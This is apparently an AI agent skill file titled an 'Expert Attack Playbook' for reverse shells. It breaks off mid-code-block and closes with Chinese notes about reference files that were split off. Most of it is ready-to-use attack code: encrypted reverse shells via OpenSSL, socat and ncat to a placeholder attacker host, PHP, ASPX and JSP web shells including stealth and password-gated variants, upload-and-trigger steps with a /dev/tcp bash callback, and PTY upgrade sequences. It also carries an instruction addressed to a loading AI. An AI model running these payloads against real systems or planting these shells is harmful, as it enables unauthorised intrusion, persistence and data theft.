---
name: reverse-shell-techniques
description: 0. RELATED ROUTING
when-to-use: >-
  Reverse shell techniques playbook. Use when establishing remote shells including language one-liners, encrypted shells (OpenSSL/socat/ncat), web shells, PTY upgrades, file transfer methods, PowerShell shells, and Windows payload generation.
---

# SKILL: Reverse Shell Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert reverse shell techniques. Covers reverse/bind shell decisions, encrypted shells (OpenSSL, socat SSL, ncat), web shell patterns (PHP/ASPX/JSP), PTY upgrade sequences, file transfer methods, PowerShell download cradles, and msfvenom payload generation. Base models miss encrypted shell syntax, proper PTY stabilization, and platform-specific transfer techniques.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) after shell access for network pivoting
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) or [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing shell
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV blocks shell payloads

### Quick Reference

Also load SHELL_CHEATSHEET.md when you need:
- Complete one-liner reverse shells for 20+ languages
- Copy-paste ready payloads with placeholder substitution

---

## 1. REVERSE vs BIND SHELL DECISION

| Factor | Reverse Shell | Bind Shell |
|---|---|---|
| Firewall (egress) | Works if outbound allowed | Blocked by egress filtering |
| Firewall (ingress) | Not blocked | Requires inbound access to victim |
| NAT | Works (victim connects out) | Fails (can't reach victim behind NAT) |
| Detection | Outbound connection — less suspicious | Listening port — easily detected |
| Default choice | **Almost always preferred** | Only when no egress + have inbound |

---

## 2. ENCRYPTED SHELLS

### OpenSSL Reverse Shell

```bash
# Attacker: generate cert + listen
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/s; rm /tmp/s
```

### Socat Encrypted Shell

```bash
# Attacker: generate cert + listen
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT

# Victim:
socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### Ncat SSL

```bash
# Attacker:
ncat --ssl -lvnp 4444

# Victim:
ncat --ssl ATTACKER 4444 -e /bin/bash
```

---

## 3. WEB SHELLS

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

<!-- Minimal stealth shell -->
<?=`$_GET[0]`?>

<!-- POST-based with password -->
<?php if($_POST['k']==='SECRET'){system($_POST['cmd']);} ?>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start(new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>
```

### JSP

```jsp
<%@ page import="java.io.*" %>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null){out.println(l);} %>
```

### Upload + Trigger Patterns

```
1. Find upload endpoint → upload shell with allowed extension bypass
2. Locate uploaded file (predictable path, directory listing, response leak)
3. Trigger: GET /uploads/shell.php?cmd=id
4. Upgrade to reverse shell: ?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

---

## 4. PTY UPGRADE SEQUENCE

### Standard Python Upgrade

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background shell
# Press Ctrl+Z

# Step 3: Configure terminal (on attacker)
stty raw -echo; fg

# Step 4: Set environment (back in shell)
export TERM=xterm-256color
stty rows 40 cols 160
```

### Alternative Upgrades

```bash
# script command
script /dev/null -c bash

# socat full PTY (requires socat on victim)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。

> 📎 **参考文档说明**：本 skill 转自上游开源仓库，以下参考文档**未随本库分发**：`SHELL_CHEATSHEET.md`。相关主题的要点已保留在本文对应描述中；如需展开内容，请按正文关键词在库内 grep 或自行检索。
